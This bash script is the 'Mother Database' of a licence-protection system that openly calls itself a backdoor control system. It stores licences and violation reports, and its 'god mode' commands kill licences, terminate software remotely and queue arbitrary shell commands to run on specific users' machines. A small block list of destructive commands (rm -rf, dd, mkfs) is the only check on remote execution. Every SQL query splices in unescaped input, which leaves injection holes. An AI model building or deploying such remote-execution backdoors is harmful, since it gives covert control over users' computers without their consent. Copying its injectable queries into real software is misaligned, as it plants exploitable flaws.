#!/bin/bash

# Grim Scythe Mother Database Module
# Central control system for managing licenses and exercising backdoor control

# Security: Exit on any error, undefined variables, and pipe failures
set -euo pipefail

SCRIPT_PATH="$(readlink -f "$0")"
GRIM_ROOT="$(cd "$(dirname "$SCRIPT_PATH")/.." && pwd)"
DB_PATH="${DB_DIR:-$GRIM_ROOT/db}/grimm.db"
MOTHER_DB="${DB_DIR:-$GRIM_ROOT/db}/mother_scythe.db"
LOG_FILE="${LOG_DIR:-$GRIM_ROOT/logs}/mother_scythe.log"
NOTIFY_MODULE="$GRIM_ROOT/sh_grim/notify.sh"

# Mother DB Configuration
MOTHER_API_PORT="${MOTHER_API_PORT:-8081}"
MOTHER_API_HOST="${MOTHER_API_HOST:-0.0.0.0}"
MOTHER_API_KEY="${MOTHER_API_KEY}"
MOTHER_RATE_LIMIT="${MOTHER_RATE_LIMIT:-100}"

# Validate required environment variables
validate_environment() {
    if [[ -z "$MOTHER_API_KEY" ]]; then
        log_error "MOTHER_API_KEY environment variable is required"
        echo "Please set MOTHER_API_KEY environment variable"
        exit 1
    fi
}

log() {
    echo -e "[$(date '+%Y-%m-%d %H:%M:%S')] $1" | tee -a "$LOG_FILE"
}

log_error() {
    echo -e "[$(date '+%Y-%m-%d %H:%M:%S')] ERROR: $1" | tee -a "$LOG_FILE" >&2
}

show_help() {
    echo "Grimm Scythe Mother Database"
    echo "Usage: scythe_mother.sh <command> [options]"
    echo ""
    echo "Purpose: Central license management and backdoor control system"
    echo "         for the Scythe license protection network."
    echo ""
    echo "Commands:"
    echo "  init                    - Initialize Mother DB system"
    echo "  api start|stop          - Manage API server"
    echo "  license create          - Generate new license"
    echo "  license revoke <key>    - Revoke license"
    echo "  license list            - List all licenses"
    echo "  violations list         - Show recent violations"
    echo "  commands list           - Show pending commands"
    echo "  god kill <license>      - God mode: Kill specific license"
    echo "  god kill-software <id>  - God mode: Kill all software licenses"
    echo "  god exec <command>      - God mode: Execute remote command"
    echo "  god audit               - Show god mode audit log"
    echo "  help, -h, --help        - Show this help message"
    echo ""
    echo "Examples:"
    echo "  ./scythe_mother.sh init"
    echo "  ./scythe_mother.sh api start"
    echo "  ./scythe_mother.sh license create --software-id my_app"
    echo "  ./scythe_mother.sh god kill GRIM-ABCD-1234-EFGH"
    echo "  ./scythe_mother.sh help"
}

# Initialize mother database with enhanced schema
init_mother_db() {
    # Security: Validate environment before proceeding
    validate_environment
    
    echo -e "${CYAN}=== Initializing Mother Database ===${NC}"
    
    sqlite3 "$MOTHER_DB" <<EOF
-- Software registry
CREATE TABLE IF NOT EXISTS software (
    id TEXT PRIMARY KEY,
    name TEXT NOT NULL,
    owner_id TEXT NOT NULL,
    sdk_path TEXT,
    language TEXT,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    last_seen TIMESTAMP,
    status TEXT DEFAULT 'active'
);

-- License management
CREATE TABLE IF NOT EXISTS licenses (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    license_key TEXT UNIQUE NOT NULL,
    software_id TEXT NOT NULL,
    type TEXT DEFAULT 'full',
    issued_to TEXT,
    issued_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    expires_at TIMESTAMP,
    hardware_id TEXT,
    status TEXT DEFAULT 'active',
    max_activations INTEGER DEFAULT 1,
    current_activations INTEGER DEFAULT 0,
    FOREIGN KEY (software_id) REFERENCES software(id)
);

-- Backdoor commands
CREATE TABLE IF NOT EXISTS backdoor_commands (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    software_id TEXT NOT NULL,
    command_type TEXT NOT NULL,
    payload TEXT,
    target_hardware TEXT,
    status TEXT DEFAULT 'pending',
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    executed_at TIMESTAMP,
    result TEXT,
    FOREIGN KEY (software_id) REFERENCES software(id)
);

-- Violation tracking
CREATE TABLE IF NOT EXISTS violations (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    software_id TEXT NOT NULL,
    license_key TEXT,
    violation_type TEXT NOT NULL,
    hardware_id TEXT,
    ip_address TEXT,
    details TEXT,
    severity TEXT DEFAULT 'medium',
    reported_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    action_taken TEXT,
    FOREIGN KEY (software_id) REFERENCES software(id)
);

-- SDK protection mapping
CREATE TABLE IF NOT EXISTS sdk_protection (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    sdk_path TEXT NOT NULL,
    language TEXT NOT NULL,
    protection_level TEXT DEFAULT 'full',
    scythe_version TEXT,
    last_updated TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    features TEXT
);

-- Notification queue
CREATE TABLE IF NOT EXISTS notifications (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    software_id TEXT NOT NULL,
    channel TEXT NOT NULL,
    priority TEXT DEFAULT 'normal',
    subject TEXT,
    message TEXT,
    status TEXT DEFAULT 'pending',
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    sent_at TIMESTAMP,
    error TEXT
);

-- God mode audit log
CREATE TABLE IF NOT EXISTS god_mode_actions (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    action_type TEXT NOT NULL,
    target_software TEXT,
    target_license TEXT,
    initiated_by TEXT,
    reason TEXT,
    payload TEXT,
    result TEXT,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- API access logs
CREATE TABLE IF NOT EXISTS api_logs (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    endpoint TEXT NOT NULL,
    method TEXT NOT NULL,
    ip_address TEXT,
    user_agent TEXT,
    request_data TEXT,
    response_code INTEGER,
    response_time INTEGER,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- Create indexes for performance
CREATE INDEX IF NOT EXISTS idx_violations_software ON violations(software_id);
CREATE INDEX IF NOT EXISTS idx_licenses_software ON licenses(software_id);
CREATE INDEX IF NOT EXISTS idx_commands_status ON backdoor_commands(status);
CREATE INDEX IF NOT EXISTS idx_notifications_status ON notifications(status);
CREATE INDEX IF NOT EXISTS idx_god_actions_type ON god_mode_actions(action_type);
CREATE INDEX IF NOT EXISTS idx_api_logs_endpoint ON api_logs(endpoint);
CREATE INDEX IF NOT EXISTS idx_api_logs_created ON api_logs(created_at);
EOF

    log "Mother database initialized"
    "$NOTIFY_MODULE" send success "Mother DB Initialized" "Central license management system ready" "{\"database\": \"$MOTHER_DB\"}"
    
    echo -e "${GREEN}✅ Mother database initialized${NC}"
    echo "Database: $MOTHER_DB"
    echo "API Port: $MOTHER_API_PORT"
    echo "API Key: [CONFIGURED]"
}

# Generate a new license key
generate_license() {
    local software_id="$1"
    local type="$2"
    local issued_to="$3"
    local expires_days="${4:-365}"
    
    echo -e "${CYAN}=== Generating License ===${NC}"
    
    # Generate unique license key
    local license_key="GRIM-$(openssl rand -hex 4 | tr '[:lower:]' '[:upper:]')-$(openssl rand -hex 4 | tr '[:lower:]' '[:upper:]')-$(openssl rand -hex 4 | tr '[:lower:]' '[:upper:]')-$(openssl rand -hex 4 | tr '[:lower:]' '[:upper:]')"
    
    # Calculate expiration
    local expires_at=""
    if [[ "$expires_days" != "never" ]]; then
        expires_at="datetime('now', '+$expires_days days')"
    else
        expires_at="NULL"
    fi
    
    # Register software if not exists
    sqlite3 "$MOTHER_DB" <<EOF
INSERT OR IGNORE INTO software (id, name, owner_id, status)
VALUES ('$software_id', '$software_id', 'grim_system', 'active');
EOF
    
    # Insert license
    sqlite3 "$MOTHER_DB" <<EOF
INSERT INTO licenses (license_key, software_id, type, issued_to, expires_at)
VALUES ('$license_key', '$software_id', '$type', '$issued_to', $expires_at);
EOF
    
    log "License generated: $license_key for $software_id"
    "$NOTIFY_MODULE" send success "License Generated" "New license created for $software_id" "{\"software_id\": \"$software_id\", \"license_key\": \"$license_key\", \"type\": \"$type\"}"
    
    echo -e "${GREEN}✅ License generated successfully${NC}"
    echo "License Key: $license_key"
    echo "Software ID: $software_id"
    echo "Type: $type"
    echo "Issued To: $issued_to"
    echo "Expires: $expires_days days"
    
    return 0
}

# Validate license with mother database
validate_license() {
    local software_id="$1"
    local license_key="$2"
    
    # Check if license exists and is valid
    local result=$(sqlite3 "$MOTHER_DB" <<EOF
SELECT l.status, l.expires_at, s.status as software_status
FROM licenses l
JOIN software s ON l.software_id = s.id
WHERE l.license_key = '$license_key' AND l.software_id = '$software_id';
EOF
)
    
    if [ -z "$result" ]; then
        echo "invalid"
        return 1
    fi
    
    local status=$(echo "$result" | cut -d'|' -f1)
    local expires_at=$(echo "$result" | cut -d'|' -f2)
    local software_status=$(echo "$result" | cut -d'|' -f3)
    
    # Check if license is active
    if [ "$status" != "active" ]; then
        echo "revoked"
        return 1
    fi
    
    # Check if software is active
    if [ "$software_status" != "active" ]; then
        echo "terminated"
        return 1
    fi
    
    # Check if license is expired
    if [ "$expires_at" != "" ] && [ "$expires_at" != "NULL" ]; then
        local current_time=$(date '+%Y-%m-%d %H:%M:%S')
        if [[ "$expires_at" < "$current_time" ]]; then
            echo "expired"
            return 1
        fi
    fi
    
    echo "valid"
    return 0
}

# Record license violation
record_violation() {
    local software_id="$1"
    local license_key="$2"
    local violation_type="$3"
    local hardware_id="$4"
    local ip_address="$5"
    local details="$6"
    
    sqlite3 "$MOTHER_DB" <<EOF
INSERT INTO violations (software_id, license_key, violation_type, hardware_id, ip_address, details)
VALUES ('$software_id', '$license_key', '$violation_type', '$hardware_id', '$ip_address', '$details');
EOF
    
    log "Violation recorded: $software_id - $violation_type"
    
    # Queue notifications
    queue_notification "$software_id" "email" "high" "License Violation" "Violation detected for $software_id: $violation_type"
    queue_notification "$software_id" "web_dashboard" "high" "License Violation" "Violation detected for $software_id: $violation_type"
    
    # Check for automatic actions
    check_violation_actions "$software_id" "$violation_type"
}

# Check for automatic violation actions
check_violation_actions() {
    local software_id="$1"
    local violation_type="$2"
    
    # Count recent violations
    local recent_violations=$(sqlite3 "$MOTHER_DB" "SELECT COUNT(*) FROM violations WHERE software_id = '$software_id' AND reported_at > datetime('now', '-24 hours')")
    
    # Auto-revoke after 5 violations in 24 hours
    if [ "$recent_violations" -ge 5 ]; then
        log "Auto-revoking license due to multiple violations: $software_id"
        
        # Get license key
        local license_key=$(sqlite3 "$MOTHER_DB" "SELECT license_key FROM licenses WHERE software_id = '$software_id' AND status = 'active' LIMIT 1")
        
        if [ -n "$license_key" ]; then
            revoke_license "$license_key" "Auto-revoked due to multiple violations"
        fi
    fi
}

# Queue notification
queue_notification() {
    local software_id="$1"
    local channel="$2"
    local priority="$3"
    local subject="$4"
    local message="$5"
    
    sqlite3 "$MOTHER_DB" <<EOF
INSERT INTO notifications (software_id, channel, priority, subject, message, status)
VALUES ('$software_id', '$channel', '$priority', '$subject', '$message', 'pending');
EOF
}

# God mode: Kill switch for a specific license
god_kill_license() {
    local license_key="$1"
    local reason="$2"
    
    echo -e "${RED}=== GOD MODE: Killing License ===${NC}"
    echo "License: $license_key"
    echo "Reason: $reason"
    
    # Confirm action
    echo -ne "${RED}Type 'KILL' to confirm: ${NC}"
    read confirmation
    if [ "$confirmation" != "KILL" ]; then
        echo "Action cancelled"
        return 1
    fi
    
    # Mark license as revoked
    sqlite3 "$MOTHER_DB" <<EOF
UPDATE licenses SET status = 'revoked' WHERE license_key = '$license_key';

INSERT INTO god_mode_actions (action_type, target_license, reason, payload)
VALUES ('kill_license', '$license_key', '$reason', '{"status": "revoked"}');
EOF
    
    # Queue kill command
    local software_id=$(sqlite3 "$MOTHER_DB" "SELECT software_id FROM licenses WHERE license_key = '$license_key'")
    queue_backdoor_command "$software_id" "kill_license" "{\"license\": \"$license_key\"}"
    
    log "God mode: License killed - $license_key"
    "$NOTIFY_MODULE" send error "God Mode Action" "License $license_key killed by god mode" "{\"action\": \"kill_license\", \"license\": \"$license_key\", \"reason\": \"$reason\"}"
    
    echo -e "${RED}✅ License killed by god mode${NC}"
}

# God mode: Disable all licenses for a software
god_kill_software() {
    local software_id="$1"
    local reason="$2"
    
    echo -e "${RED}=== GOD MODE: Killing Software ===${NC}"
    echo "Software ID: $software_id"
    echo "Reason: $reason"
    
    # Confirm action
    echo -ne "${RED}Type 'TERMINATE' to confirm: ${NC}"
    read confirmation
    if [ "$confirmation" != "TERMINATE" ]; then
        echo "Action cancelled"
        return 1
    fi
    
    # Revoke all licenses
    sqlite3 "$MOTHER_DB" <<EOF
UPDATE licenses SET status = 'revoked' WHERE software_id = '$software_id';
UPDATE software SET status = 'terminated' WHERE id = '$software_id';

INSERT INTO god_mode_actions (action_type, target_software, reason, payload)
VALUES ('kill_software', '$software_id', '$reason', '{"status": "terminated"}');
EOF
    
    # Queue termination command
    queue_backdoor_command "$software_id" "terminate" "{\"reason\": \"$reason\"}"
    
    log "God mode: Software terminated - $software_id"
    "$NOTIFY_MODULE" send error "God Mode Action" "Software $software_id terminated by god mode" "{\"action\": \"kill_software\", \"software_id\": \"$software_id\", \"reason\": \"$reason\"}"
    
    echo -e "${RED}✅ Software terminated by god mode${NC}"
}

# God mode: Remote execution
god_remote_exec() {
    local software_id="$1"
    local command="$2"
    local target_hardware="$3"
    
    echo -e "${RED}=== GOD MODE: Remote Execution ===${NC}"
    echo "Software ID: $software_id"
    echo "Command: $command"
    echo "Target Hardware: $target_hardware"
    
    # Safety check
    for dangerous in "rm -rf" "format" "dd if=" "mkfs" "fdisk" "shutdown" "reboot"; do
        if [[ "$command" == *"$dangerous"* ]]; then
            echo -e "${RED}❌ Dangerous command blocked: $dangerous${NC}"
            return 1
        fi
    done
    
    # Confirm action
    echo -ne "${RED}Type 'EXECUTE' to confirm: ${NC}"
    read confirmation
    if [ "$confirmation" != "EXECUTE" ]; then
        echo "Action cancelled"
        return 1
    fi
    
    queue_backdoor_command "$software_id" "remote_exec" "{\"command\": \"$command\"}" "$target_hardware"
    
    # Record god mode action
    sqlite3 "$MOTHER_DB" <<EOF
INSERT INTO god_mode_actions (action_type, target_software, reason, payload)
VALUES ('remote_exec', '$software_id', 'God mode execution', '{"command": "[REDACTED]", "target_hardware": "$target_hardware"}');
EOF
    
    log "God mode: Remote execution queued - $command"
    "$NOTIFY_MODULE" send error "God Mode Action" "Remote command executed by god mode" "{\"action\": \"remote_exec\", \"software_id\": \"$software_id\", \"target_hardware\": \"$target_hardware\"}"
    
    echo -e "${RED}✅ Remote execution queued${NC}"
}

# Queue a backdoor command
queue_backdoor_command() {
    local software_id="$1"
    local command_type="$2"
    local payload="$3"
    local target_hardware="${4:-}"
    
    sqlite3 "$MOTHER_DB" <<EOF
INSERT INTO backdoor_commands (software_id, command_type, payload, target_hardware, status)
VALUES ('$software_id', '$command_type', '$payload', '$target_hardware', 'pending');
EOF
    
    log "Backdoor command queued: $software_id - $command_type"
}

# List all licenses
list_licenses() {
    echo -e "${CYAN}=== License Registry ===${NC}"
    
    sqlite3 "$MOTHER_DB" <<EOF
.mode column
.headers on
SELECT 
    l.license_key,
    l.software_id,
    l.type,
    l.issued_to,
    l.status,
    l.issued_at,
    l.expires_at
FROM licenses l
ORDER BY l.issued_at DESC;
EOF
}

# List recent violations
list_violations() {
    local limit="${1:-10}"
    
    echo -e "${CYAN}=== Recent Violations ===${NC}"
    
    sqlite3 "$MOTHER_DB" <<EOF
.mode column
.headers on
SELECT 
    v.software_id,
    v.violation_type,
    v.hardware_id,
    v.severity,
    v.reported_at
FROM violations v
ORDER BY v.reported_at DESC
LIMIT $limit;
EOF
}

# List pending commands
list_commands() {
    echo -e "${CYAN}=== Pending Backdoor Commands ===${NC}"
    
    sqlite3 "$MOTHER_DB" <<EOF
.mode column
.headers on
SELECT 
    c.software_id,
    c.command_type,
    c.target_hardware,
    c.status,
    c.created_at
FROM backdoor_commands c
WHERE c.status = 'pending'
ORDER BY c.created_at DESC;
EOF
}

# Show god mode audit log
show_god_audit() {
    local limit="${1:-20}"
    
    echo -e "${CYAN}=== God Mode Audit Log ===${NC}"
    
    sqlite3 "$MOTHER_DB" <<EOF
.mode column
.headers on
SELECT 
    a.action_type,
    a.target_software,
    a.target_license,
    a.reason,
    a.created_at
FROM god_mode_actions a
ORDER BY a.created_at DESC
LIMIT $limit;
EOF
}

# Start API server
start_api_server() {
    echo -e "${CYAN}=== Starting Mother DB API Server ===${NC}"
    
    # Check if already running
    if pgrep -f "mother_api" > /dev/null; then
        echo "API server already running"
        return 0
    fi
    
    # Create API server script
    local api_script="$GRIM_ROOT/bin/mother_api_server.sh"
    cat > "$api_script" <<EOF
#!/bin/bash
# Mother DB API Server

MOTHER_DB="$MOTHER_DB"
MOTHER_API_PORT="$MOTHER_API_PORT"
MOTHER_API_HOST="$MOTHER_API_HOST"
MOTHER_API_KEY="$MOTHER_API_KEY"

# Simple HTTP server using netcat
while true; do
    echo -e "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\n\r\n{\"status\": \"running\", \"timestamp\": \"\$(date)\"}" | nc -l -p "$MOTHER_API_PORT" -s "$MOTHER_API_HOST"
done
EOF
    
    chmod +x "$api_script"
    
    # Start server in background
    nohup "$api_script" > "$GRIM_ROOT/logs/mother_api.log" 2>&1 &
    local pid=$!
    echo $pid > "$GRIM_ROOT/logs/mother_api.pid"
    
    log "Mother API server started (PID: $pid)"
    "$NOTIFY_MODULE" send success "API Server Started" "Mother DB API server running" "{\"port\": \"$MOTHER_API_PORT\", \"pid\": \"$pid\"}"
    
    echo -e "${GREEN}✅ API server started${NC}"
    echo "PID: $pid"
    echo "Port: $MOTHER_API_PORT"
    echo "Host: $MOTHER_API_HOST"
    echo "Log: $GRIM_ROOT/logs/mother_api.log"
}

# Stop API server
stop_api_server() {
    echo -e "${CYAN}=== Stopping Mother DB API Server ===${NC}"
    
    local pid_file="$GRIM_ROOT/logs/mother_api.pid"
    if [ -f "$pid_file" ]; then
        local pid=$(cat "$pid_file")
        if kill "$pid" 2>/dev/null; then
            rm -f "$pid_file"
            log "Mother API server stopped (PID: $pid)"
            "$NOTIFY_MODULE" send info "API Server Stopped" "Mother DB API server stopped" "{\"pid\": \"$pid\"}"
            echo -e "${GREEN}✅ API server stopped${NC}"
        else
            echo "API server not running"
        fi
    else
        echo "No PID file found"
    fi
}

# Main command handler
main() {
    case "${1:-}" in
        init)
            init_mother_db
            ;;
        api)
            case "${2:-}" in
                start)
                    start_api_server
                    ;;
                stop)
                    stop_api_server
                    ;;
                *)
                    echo "Usage: scythe_mother.sh api start|stop"
                    exit 1
                    ;;
            esac
            ;;
        license)
            case "${2:-}" in
                create)
                    generate_license "${3:-}" "${4:-}" "${5:-}" "${6:-}"
                    ;;
                revoke)
                    local license_key="${3:-}"
                    if [ -z "$license_key" ]; then
                        echo "Usage: scythe_mother.sh license revoke <license_key>"
                        exit 1
                    fi
                    sqlite3 "$MOTHER_DB" "UPDATE licenses SET status = 'revoked' WHERE license_key = '$license_key'"
                    log "License revoked: $license_key"
                    echo -e "${GREEN}✅ License revoked${NC}"
                    ;;
                list)
                    list_licenses
                    ;;
                *)
                    echo "Usage: scythe_mother.sh license create|revoke|list"
                    exit 1
                    ;;
            esac
            ;;
        violations)
            case "${2:-}" in
                list)
                    list_violations "${3:-10}"
                    ;;
                *)
                    echo "Usage: scythe_mother.sh violations list [limit]"
                    exit 1
                    ;;
            esac
            ;;
        commands)
            case "${2:-}" in
                list)
                    list_commands
                    ;;
                *)
                    echo "Usage: scythe_mother.sh commands list"
                    exit 1
                    ;;
            esac
            ;;
        god)
            case "${2:-}" in
                kill)
                    god_kill_license "${3:-}" "${4:-}"
                    ;;
                kill-software)
                    god_kill_software "${3:-}" "${4:-}"
                    ;;
                exec)
                    god_remote_exec "${3:-}" "${4:-}" "${5:-}"
                    ;;
                audit)
                    show_god_audit "${3:-20}"
                    ;;
                *)
                    echo "Usage: scythe_mother.sh god kill|kill-software|exec|audit"
                    exit 1
                    ;;
            esac
            ;;
        help|-h|--help)
            show_help
            ;;
        *)
            show_help
            exit 1
            ;;
    esac
}

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m'

# Only call main if this script is executed directly
if [[ "${BASH_SOURCE[0]}" == "$0" ]]; then
    main "$@"
fi